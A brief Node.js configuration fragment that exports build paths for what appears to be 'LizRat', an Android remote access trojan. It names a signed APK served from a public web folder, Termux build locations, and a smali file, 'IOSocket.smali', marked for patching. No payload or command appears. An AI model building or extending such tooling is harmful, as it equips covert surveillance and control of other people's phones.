...
exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/LizRat.apk')

exports.termuxApkBuildPath = exports.termux + '/lizrat/build.apk'
exports.termuxApkSignedBuildPath = exports.termux + '/lizrat/LizRat.apk'
...
exports.patchFilePath = path.join(exports.smaliPath, '/smali_classes4/com/Liz0rd/lizrat/IOSocket.smali');
